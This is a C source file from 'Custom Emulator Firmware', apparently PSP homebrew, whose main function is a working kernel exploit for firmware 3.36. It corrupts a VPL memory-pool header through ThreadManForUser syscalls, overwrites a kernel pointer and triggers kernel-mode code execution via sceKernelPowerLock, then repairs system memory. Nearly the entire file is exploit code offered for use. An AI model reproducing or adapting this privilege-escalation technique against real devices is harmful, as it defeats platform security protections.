/*
	Custom Emulator Firmware
	Copyright (C) 2014, Total_Noob

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <common.h>

#include "main.h"
#include "libc.h"
#include "utils.h"

#define MAKE_JUMP(f) (0x08000000 | (((u32)(f) >> 2)  & 0x03ffffff))

u32 sw_address_336 = 0x88014338;

void RepairSysmem()
{
	//3.36
	_sw(0x8809F35C, sw_address_336);
	_sw(0, sw_address_336 + 4);
}

void doExploit()
{
  void (* _sceKernelDcacheWritebackAll)(void) = (void *)FindImport("UtilsForUser", 0x79D1C3FA);
  void (* _sceKernelPowerLock)(u32) = (void *)FindImport("sceSuspendForUser", 0xEADB1BD7);
	/* Find the vulnerable function */
	SceUID (* _sceKernelCreateVpl)(const char *name, int part, int attr, unsigned int size, struct SceKernelVplOptParam *opt) = (void *)FindImportVolatileMem("ThreadManForUser", 0x56C039B5);
	int (* _sceKernelTryAllocateVpl)(SceUID uid, unsigned int size, void **data) = (void *)FindImportVolatileMem("ThreadManForUser", 0xAF36D708);
	int (* _sceKernelFreeVpl)(SceUID uid, void *data) = (void *)FindImportVolatileMem("ThreadManForUser", 0xB736E9FF);
	int (* _sceKernelDeleteVpl)(SceUID uid) = (void *)FindImportVolatileMem("ThreadManForUser", 0x89B3D48C);


	SceUID vpl = _sceKernelCreateVpl("kexploit", 2, 1, 512, NULL);

	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);

	u32 addr1 = (*(u32*)0x08801000 + 0x100);
	u32 addr2 = *(u32*)addr1;

	_sceKernelFreeVpl(vpl, (void *)0x08801000);
	_sceKernelDeleteVpl(vpl);

	vpl = _sceKernelCreateVpl("kexploit", 2, 1, 512, NULL);

	_sw(((sw_address_336 - addr2) + 0x108) / 8, addr2 + 4);

	_sceKernelTryAllocateVpl(vpl, 256, (void *)0x08801000);

	u32 jumpto = addr2 - 16;

	u32 kfuncaddr = (u32)kernel_function | 0x80000000;

	_sw(kfuncaddr, jumpto + 0x10);
	
	_sceKernelDcacheWritebackAll();
	
	/* Execute kernel function */
	_sceKernelPowerLock(0);
}
